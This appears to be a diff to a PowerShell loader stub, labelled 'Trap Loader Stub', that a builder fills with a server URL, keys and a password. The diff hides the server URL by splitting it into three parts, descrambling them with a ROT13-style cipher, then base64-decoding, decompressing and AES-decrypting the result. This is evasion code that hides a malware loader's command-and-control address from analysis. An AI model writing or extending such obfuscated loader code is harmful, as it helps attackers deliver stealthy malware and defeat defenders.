@@ -1,7 +1,44 @@
 # Trap Loader Stub - AES-256-CBC + HMAC-SHA256 + RSA Key Exchange
 # Placeholders are replaced at build time by the Builder
 
-$serverUrl = "{{SERVER_URL}}"
+$urlPart1 = '{{URL_PART1}}'
+$urlPart2 = '{{URL_PART2}}'
+$urlPart3 = '{{URL_PART3}}'
+$aesKey = [byte[]]@({{AES_KEY}})
+$aesIv = [byte[]]@({{AES_IV}})
+
+function Descramble($s) {
+    $sb = New-Object Text.StringBuilder
+    foreach ($c in $s.ToCharArray()) {
+        $v = [int][char]$c
+        if ($v -ge 65 -and $v -le 90) { [void]$sb.Append([char](($v - 65 + 13) % 26 + 65)) }
+        elseif ($v -ge 97 -and $v -le 122) { [void]$sb.Append([char](($v - 97 + 13) % 26 + 97)) }
+        elseif ($v -ge 48 -and $v -le 57) { [void]$sb.Append([char](($v - 48 + 5) % 10 + 48)) }
+        elseif ($c -eq '!') { [void]$sb.Append('+') }
+        elseif ($c -eq '?') { [void]$sb.Append('/') }
+        elseif ($c -eq '*') { [void]$sb.Append('=') }
+        else { [void]$sb.Append($c) }
+    }
+    return $sb.ToString()
+}
+
+$full = Descramble ($urlPart1 + $urlPart2 + $urlPart3)
+$compressed = [Convert]::FromBase64String($full)
+$msIn = New-Object IO.MemoryStream(@(,$compressed))
+$gzip = New-Object IO.Compression.GzipStream($msIn, [IO.Compression.CompressionMode]::Decompress)
+$msOut = New-Object IO.MemoryStream
+$gzip.CopyTo($msOut); $gzip.Close()
+$ciphertext = $msOut.ToArray(); $msOut.Close(); $msIn.Close()
+
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $aesKey; $aes.IV = $aesIv
+$decryptor = $aes.CreateDecryptor()
+$ms = New-Object IO.MemoryStream(@(,$ciphertext))
+$cs = New-Object Security.Cryptography.CryptoStream($ms, $decryptor, [Security.Cryptography.CryptoStreamMode]::Read)
+$sr = New-Object IO.StreamReader($cs)
+$serverUrl = $sr.ReadToEnd()
+$cs.Close(); $ms.Close()
+
 $httpPassword = "{{PASSWORD}}"
 $encryptionKey = "{{ENCRYPTION_KEY}}"
 
